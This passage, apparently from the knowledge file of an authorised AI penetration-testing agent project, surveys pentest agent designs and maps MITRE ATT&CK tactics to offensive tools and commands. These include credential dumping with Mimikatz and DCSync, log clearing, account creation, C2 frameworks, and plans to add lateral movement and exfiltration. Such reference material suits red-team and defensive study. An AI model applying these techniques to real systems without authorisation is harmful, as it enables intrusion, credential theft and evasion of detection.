| **架构** | MCP Server + Python Agent |
| **工具数** | 197+ |
| **特色** | Exploit Chaining + PoC 自动验证 |

#### pentest-ai-agents — Claude Code 31 专业子 Agent

| 属性 | 值 |
|------|---|
| **来源** | vpncentral.com 报道 |
| **架构** | Claude Code Native（子 Agent 模式）|
| **Agent 数** | 31 个专业子 Agent |
| **场景** | 授权渗透测试 |

子 Agent 示例：
- Web 应用测试 Agent
- API 安全 Agent
- 认证绕过 Agent
- 提权 Agent
- 报告生成 Agent


### 21.3 其他值得关注的项目

| 项目 | 架构 | 特点 | 链接 |
|------|------|------|------|
| **antoninoLorenzo/AI-OPS** | 单Agent | 基于开源 LLM，无需 API 费用 | https://github.com/antoninoLorenzo/AI-OPS |
| **nbshenxm/pentest-agent** | Planner-Executor | 学术论文支撑（ACM发表） | https://github.com/nbshenxm/pentest-agent |
| **youngsecurity/pentest-agent-system** | MITRE ATT&CK | 按 ATT&CK 框架自主执行 | https://github.com/youngsecurity/pentest-agent-system |
| **Armur-Ai/Auto-Pentest-GPT-AI** | 单Agent | LLM 驱动的软件渗透测试 | https://github.com/Armur-Ai/Auto-Pentest-GPT-AI |
| **shlomihod/awesome-ai-red-teaming** | 资源列表 | AI 红队（对抗ML模型） | https://github.com/shlomihod/awesome-ai-red-teaming |

### 21.4 架构对比与选型建议

| 架构 | 优势 | 劣势 | 适用场景 |
|------|------|------|---------|
| **单 Agent** | 简单、低成本 | 能力有限、易卡死 | 单点漏洞验证 |
| **Planner-Executor** | 任务分解清晰 | 规划质量依赖 LLM | 完整渗透流程 |
| **专业角色** | 各司其职、效率高 | 协调复杂 | 团队化红队 |
| **Swarm** | 高并发、自适应 | 资源消耗大 | 大规模资产 |
| **MCP Server** | 工具集成灵活 | 需要 MCP 客户端 | 工具桥接 |
| **Claude Code Native** | 与 IDE 深度集成 | 依赖 Claude | 日常安全开发 |

**结论：多 Agent 架构始终优于单 Agent，推荐 Planner-Executor 或 Swarm 模式。**

### 21.5 与 Bai-codeagent 的整合建议

```
当前 Bai-codeagent 架构（Claude Code Native + Auto Agent）
可以吸收的能力：

1. 从 PentAGI 学习：
   - Docker 隔离执行（安全运行危险命令）
   - Web UI 实时监控

2. 从 Pentest-Swarm-AI 学习：
   - ReAct 推理循环（更智能的决策）
   - Go 高并发多 Agent 执行

3. 从 PentestAgent 学习：
   - RAG 知识库（将 know.md 向量化）
   - 预置 Playbook（标准化攻击序列）

4. 从 HexStrike 学习：
   - 扩充 MCP 工具集（当前 15 → 目标 70+）
   - 标准化工具接口

5. 从 pentest-ai 学习：
   - Exploit Chain 自动构建
   - PoC 自动验证流水线
```


### 21.6 AI 渗透 Agent 开发要点

#### 核心设计模式

```python
# ReAct 循环（Reasoning + Acting）
while not task_complete:
    # 1. 观察（Observe）
    observation = get_current_state()
    
    # 2. 思考（Think）
    thought = llm.reason(f"""
        目标: {target}
        已知信息: {knowledge_base}
        当前观察: {observation}
        历史操作: {action_history}
        
        下一步应该做什么？为什么？
    """)
    
    # 3. 行动（Act）
    action = llm.decide_action(thought, available_tools)
    result = execute_tool(action)
    
    # 4. 更新状态
    knowledge_base.update(result)
    action_history.append((action, result))
    
    # 5. 判断是否完成
    task_complete = llm.evaluate_completion(knowledge_base)
```

#### 安全执行要点

```
1. 命令执行沙箱
   - Docker 容器隔离（PentAGI 模式）
   - 网络命名空间限制
   - 文件系统只读挂载

2. 工具调用审批
   - Phase-Aware 阶段限制（本项目已有）
   - 危险命令二次确认
   - 速率限制 + 资源预算

3. 输出过滤
   - 敏感信息自动脱敏
   - 避免泄露目标凭据
   - 日志分级存储

4. 知识库管理
   - RAG 实时检索相关知识
   - 攻击经验持久化
   - 误报/漏报反馈学习
```



---

## 二十二、MITRE ATT&CK 红队映射

> MITRE ATT&CK 是全球通用的攻击行为知识库，将攻击者的 TTP（战术/技术/过程）标准化
> 官方网站：https://attack.mitre.org
> 参考：0xsyr0/Red-Team-Playbooks、youngsecurity/pentest-agent-system

### 22.1 ATT&CK 矩阵总览（Enterprise）

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                    MITRE ATT&CK Enterprise 14 大战术                          │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  TA0043        TA0042          TA0001          TA0002         TA0003         │
│  Reconnaissance Resource Dev   Initial Access  Execution      Persistence    │
│  侦察          资源开发         初始访问         执行           持久化         │
│                                                                              │
│  TA0004        TA0005          TA0006          TA0007         TA0008         │
│  Privilege     Defense         Credential      Discovery      Lateral        │
│  Escalation    Evasion         Access          发现           Movement       │
│  提权          防御绕过         凭据获取                        横向移动       │
│                                                                              │
│  TA0009        TA0011          TA0010          TA0040                        │
│  Collection    Command &       Exfiltration    Impact                        │
│  数据收集      Control (C2)    数据窃取         影响/破坏                     │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 22.2 各战术阶段 — 常用技术与工具映射

#### TA0043 侦察（Reconnaissance）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1595.001 | 主动扫描 - IP 段 | Nmap, Masscan, Zmap |
| T1595.002 | 主动扫描 - 漏洞 | Nuclei, Nessus, AWVS |
| T1593.001 | 搜索开放网站 - 社交媒体 | OSINT, LinkedIn |
| T1593.002 | 搜索开放网站 - 搜索引擎 | Google Dorking, FOFA |
| T1596.001 | 搜索公开数据 - DNS | subfinder, amass |
| T1596.005 | 搜索公开数据 - 扫描数据库 | Shodan, Censys |
| T1589 | 收集受害者身份信息 | theHarvester, Hunter.io |
| T1590 | 收集受害者网络信息 | whois, BGP查询 |
| T1592 | 收集受害者主机信息 | Wappalyzer, WhatWeb |


#### TA0001 初始访问（Initial Access）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1190 | 利用公开应用漏洞 | SQLMap, Nuclei, Metasploit |
| T1133 | 外部远程服务 | VPN漏洞, RDP爆破 |
| T1566.001 | 钓鱼 - 附件 | GoPhish, 宏文档 |
| T1566.002 | 钓鱼 - 链接 | Evilginx2, Gophish |
| T1078 | 合法账户 | 弱口令, 凭据泄露 |
| T1199 | 信任关系 | 供应链攻击 |
| T1189 | 水坑攻击 | BeEF, 恶意JS注入 |
| T1195 | 供应链攻击 | 恶意包, 依赖混淆 |

#### TA0002 执行（Execution）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1059.001 | PowerShell | PowerShell Empire, ps1 脚本 |
| T1059.003 | Windows CMD | cmd.exe, bat 脚本 |
| T1059.004 | Unix Shell | bash, sh, 反弹shell |
| T1059.005 | Visual Basic | VBA 宏, VBS 脚本 |
| T1059.006 | Python | Python 远控, impacket |
| T1047 | WMI | wmiexec.py, wmic |
| T1053.005 | 计划任务 | schtasks, cron |
| T1569.002 | 系统服务 | sc.exe, PsExec |
| T1204 | 用户执行 | 钓鱼诱导点击 |

#### TA0003 持久化（Persistence）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1547.001 | 注册表 Run 键 | reg add, PowerShell |
| T1053.005 | 计划任务 | schtasks /create |
| T1546.003 | WMI 事件订阅 | PowerShell WMI |
| T1543.003 | Windows 服务 | sc create |
| T1136 | 创建账户 | net user /add |
| T1098 | 账户操纵 | 添加到管理员组 |
| T1556 | 修改认证过程 | PAM后门, Skeleton Key |
| T1505.003 | Web Shell | 蚁剑, 冰蝎, 哥斯拉 |
| T1554 | 植入客户端 | DLL劫持 |


#### TA0004 提权（Privilege Escalation）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1068 | 利用漏洞提权 | 内核EXP, Windows-Exploit-Suggester |
| T1055 | 进程注入 | DLL注入, 进程镂空 |
| T1134 | 访问令牌操纵 | Incognito, Token窃取 |
| T1548.002 | UAC 绕过 | UACME, FodHelper |
| T1078 | 合法账户 | 窃取管理员凭据 |
| T1574.001 | DLL 劫持 | 替换可写DLL路径 |
| T1574.002 | DLL 侧加载 | 合法程序加载恶意DLL |
| T1053.005 | 计划任务 | SYSTEM 权限计划任务 |
| T1484 | 域策略修改 | GPO 后门 |

#### TA0005 防御绕过（Defense Evasion）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1027 | 混淆文件/信息 | 加壳, 编码, 加密 |
| T1055 | 进程注入 | 反射DLL, APC注入 |
| T1070.001 | 清除日志 | wevtutil cl |
| T1070.004 | 删除文件 | 删除工具和痕迹 |
| T1562.001 | 禁用安全工具 | 停止 AV 服务 |
| T1562.002 | 禁用日志 | ETW Patch |
| T1036 | 伪装 | 重命名为系统进程名 |
| T1140 | 反混淆/解码 | certutil -decode |
| T1218 | 系统签名二进制代理执行 | LOLBins (mshta/rundll32) |
| T1620 | 反射代码加载 | Donut, 内存加载 |

#### TA0006 凭据获取（Credential Access）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1003.001 | LSASS 内存 | Mimikatz, procdump |
| T1003.002 | SAM 数据库 | reg save, secretsdump |
| T1003.003 | NTDS.dit | ntdsutil, DCSync |
| T1003.006 | DCSync | Mimikatz lsadump::dcsync |
| T1558.003 | Kerberoasting | GetUserSPNs.py, Rubeus |
| T1558.004 | AS-REP Roasting | GetNPUsers.py |
| T1110 | 暴力破解 | Hydra, Hashcat, John |
| T1552.001 | 文件中的凭据 | grep, TruffleHog |
| T1555 | 密码存储 | 浏览器密码, Vault |
| T1557 | 中间人 | Responder, mitm6 |


#### TA0007 发现（Discovery）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1087 | 账户发现 | net user, Get-ADUser |
| T1082 | 系统信息发现 | systeminfo, uname -a |
| T1083 | 文件/目录发现 | dir, find, tree |
| T1046 | 网络服务扫描 | Nmap, Masscan |
| T1135 | 网络共享发现 | net share, smbclient |
| T1069 | 权限组发现 | net group, BloodHound |
| T1016 | 系统网络配置 | ipconfig, ifconfig |
| T1049 | 系统网络连接 | netstat, ss |
| T1018 | 远程系统发现 | net view, ping sweep |
| T1482 | 域信任发现 | nltest, Get-ADTrust |

#### TA0008 横向移动（Lateral Movement）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1021.001 | RDP | xfreerdp, mstsc |
| T1021.002 | SMB/Admin共享 | PsExec, smbexec |
| T1021.003 | DCOM | dcomexec.py |
| T1021.004 | SSH | ssh, Paramiko |
| T1021.006 | WinRM | evil-winrm, winrs |
| T1047 | WMI | wmiexec.py, wmic |
| T1550.002 | Pass the Hash | pth-winexe, Mimikatz |
| T1550.003 | Pass the Ticket | Rubeus ptt |
| T1563.002 | RDP 劫持 | tscon.exe |
| T1570 | 工具横向传输 | SMB/SCP复制 |

#### TA0011 命令与控制（C2）

| ATT&CK ID | 技术 | 对应工具/框架 |
|-----------|------|-------------|
| T1071.001 | Web 协议 (HTTP/S) | Cobalt Strike, Sliver |
| T1071.004 | DNS 协议 | DNScat2, Cobalt Strike DNS |
| T1572 | 协议隧道 | Chisel, frp, SSH隧道 |
| T1573 | 加密通道 | HTTPS C2, WireGuard |
| T1090 | 代理 | SOCKS代理, 多级跳板 |
| T1105 | 远程文件传输 | certutil, curl, wget |
| T1132 | 数据编码 | Base64, 自定义编码 |
| T1568 | 动态域名解析 | DGA, Fast-flux |
| T1102 | Web 服务 | GitHub/Telegram/Slack C2 |


#### TA0010 数据窃取（Exfiltration）

| ATT&CK ID | 技术 | 对应工具/方法 |
|-----------|------|-------------|
| T1041 | 通过 C2 通道 | Cobalt Strike download |
| T1048.001 | 通过替代协议 - 加密 | HTTPS, DNS隧道 |
| T1048.003 | 通过替代协议 - 未加密 | FTP, ICMP隧道 |
| T1567 | 通过 Web 服务 | Dropbox, Google Drive |
| T1029 | 计划传输 | 定时打包外传 |
| T1030 | 数据传输限制 | 分块传输避免告警 |
| T1537 | 传输到云账户 | 云存储 API |

### 22.3 C2 框架速查

| 框架 | 语言 | 协议 | 特点 | 链接 |
|------|------|------|------|------|
| **Cobalt Strike** | Java | HTTP/S/DNS/SMB | 商业首选，功能最全 | 商业 |
| **Sliver** | Go | HTTP/S/DNS/mTLS/WG | 开源，现代化替代CS | https://github.com/BishopFox/sliver |
| **Havoc** | C/C++ | HTTP/S | 开源，类CS界面 | https://github.com/HavocFramework/Havoc |
| **Mythic** | Go/Python | 多协议 | 插件化，多语言Agent | https://github.com/its-a-feature/Mythic |
| **Covenant** | C# | HTTP/S | .NET 专注 | https://github.com/cobbr/Covenant |
| **Villain** | Python | HTTP/S | 轻量级，反弹shell管理 | https://github.com/t3l3machus/Villain |
| **Merlin** | Go | HTTP/2/3, QUIC | HTTP/3协议隐蔽 | https://github.com/Ne0nd0g/merlin |
| **PoshC2** | Python/PS | HTTP/S | PowerShell 生态 | https://github.com/nettitude/PoshC2 |

### 22.4 ATT&CK 在报告中的应用

#### 漏洞报告 TTP 标签示例

```markdown
## 漏洞：SQL 注入 → 数据库凭据泄露 → 横向移动

### ATT&CK 映射：
- **初始访问**: T1190 (Exploit Public-Facing Application)
- **执行**: T1059.004 (Unix Shell)  
- **凭据获取**: T1552.001 (Credentials In Files)
- **横向移动**: T1021.004 (SSH)
- **数据窃取**: T1048.001 (Exfil Over Encrypted Channel)

### 攻击链：
T1190 → T1059.004 → T1552.001 → T1021.004 → T1048.001

### 影响：
攻击者可通过 SQL 注入获取数据库中的 SSH 凭据，
横向移动至内网其他服务器，窃取敏感数据。
```


#### auto_hunt findings 添加 ATT&CK 标签

```python
# 在 auto_hunt.py 的 findings 中加入 ATT&CK 标签
finding = {
    "type": "sqli",
    "severity": "critical",
    "url": "https://target.com/api/users?id=1",
    "evidence": "...",
    # 新增 ATT&CK 映射
    "attack_mapping": {
        "tactic": "Initial Access",
        "tactic_id": "TA0001",
        "technique": "Exploit Public-Facing Application",
        "technique_id": "T1190",
        "kill_chain_phase": "exploitation",
    }
}
```

### 22.5 ATT&CK Navigator — 可视化工具

```
ATT&CK Navigator 是 MITRE 官方的交互式矩阵可视化工具：
- 在线版：https://mitre-attack.github.io/attack-navigator/
- 用途：标注已测试/已发现的技术覆盖度
- 导出：JSON/SVG/Excel 多格式

使用场景：
1. 红队评估报告 — 展示攻击覆盖面
2. 防御差距分析 — 哪些技术未被检测
3. 威胁建模 — 模拟 APT 组织的 TTP
```

### 22.6 常见 APT 组织 TTP 特征

| APT 组织 | 常用初始访问 | 常用工具/恶意软件 | 目标行业 |
|----------|------------|-----------------|---------|
| APT28 (Fancy Bear) | 钓鱼邮件 | X-Agent, Zebrocy | 政府/军事 |
| APT29 (Cozy Bear) | 供应链攻击 | Sunburst, EnvyScout | 政府/IT |
| Lazarus | 水坑+钓鱼 | BLINDINGCAN, DTrack | 金融/加密货币 |
| APT41 | 供应链+Web漏洞 | ShadowPad, Winnti | 游戏/电信 |
| Turla | 水坑攻击 | Snake, Carbon | 政府/外交 |

### 22.7 Bai-codeagent ATT&CK 覆盖度

```
当前项目工具链覆盖的 ATT&CK 技术：

✅ 已覆盖（通过现有模块）：
  - TA0043 侦察：subfinder, httpx, nuclei, FOFA
  - TA0001 初始访问：Web漏洞利用（SQLi/XSS/SSRF）
  - TA0002 执行：命令注入测试
  - TA0006 凭据获取：token-scan, secrets-hunt
  - TA0007 发现：recon, surface, asset_discovery

⚠️ 部分覆盖（需扩展）：
  - TA0005 防御绕过：WAF 绕过（bypass-403）
  - TA0011 C2：无（工具本身不做C2）

❌ 未覆盖（可作为扩展方向）：
  - TA0004 提权：内网提权模块
  - TA0008 横向移动：内网横向工具
  - TA0003 持久化：后渗透持久化
  - TA0010 数据窃取：安全数据外传
```

---

*最后更新：2025-06*
